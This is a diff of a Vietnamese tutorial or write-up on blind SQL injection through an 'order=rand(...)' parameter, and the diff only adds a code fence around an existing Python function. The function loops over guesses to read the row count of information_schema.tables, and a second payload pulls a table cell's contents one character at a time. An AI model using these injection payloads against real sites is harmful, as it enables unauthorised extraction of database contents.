@@ -8,6 +8,8 @@ Thú vị hơn: nếu chúng ta cho order=rand(true) và order=rand(false) thứ
 
 Ví dụ chúng ta có thể viết 1 hàm như sau để scan giá trị độ dài của bảng information_schema.tables:
 
+```python
+
 def scan_length(url):
         query = '?order=rand((select count(*) from information_schema.tables)='
         for i in range(1,1000):
@@ -19,6 +21,8 @@ def scan_length(url):
                                 break
                 except:
                                 break
+
+```                          
 
 Và để tìm giá trị 1 ô nào đó, chúng ta dùng:
 ?order=rand((select ascii(substring(''column'',x,1)) from ''table'' limit 1)=y
